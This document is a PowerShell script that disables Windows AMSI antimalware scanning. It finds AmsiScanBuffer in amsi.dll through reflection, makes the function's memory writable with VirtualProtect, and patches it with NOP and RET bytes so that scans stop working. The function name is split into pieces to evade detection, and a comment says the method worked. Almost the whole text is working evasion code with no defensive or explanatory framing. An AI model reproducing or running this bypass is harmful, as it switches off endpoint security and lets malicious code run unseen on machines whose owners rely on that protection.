function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}


$f = "Amsi" + $null + "Scan" + $null + "Buffer"

[IntPtr]$funcAddr = LookupFunc amsi.dll $f
$oldProtectionBuffer = 0

$addr = '{0:X}' -f [Int64]$funcAddr
Write-Output "Addr: 0x$addr"

$funcaddr2 = LookupFunc kernel32.dll OpenProcess
$addr2 = '{0:X}' -f [Int64]$funcAddr2

Write-Output "Addr2: 0x$addr2"

$funcaddr3 = LookupFunc kernel32.dll WriteProcessMemory
$addr3 = '{0:X}' -f [Int64]$funcAddr3
Write-Output "Addr3: 0x$addr3"


#alot of this stuff was extra from when i was trying to find an alternative way to patch this but hey it worked


$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$op = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([Int64]$funcaddr2), (getDelegateType @([Uint32], [Bool], [UInt32]) ([IntPtr])));
$wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(($funcaddr3), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32]) ([Bool]))); 


$gcp

$procId = [Uint32]$pid


$buf = [Byte[]] (0x90, 0x90, 0xC3) 
$bufAddr = [IntPtr]

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
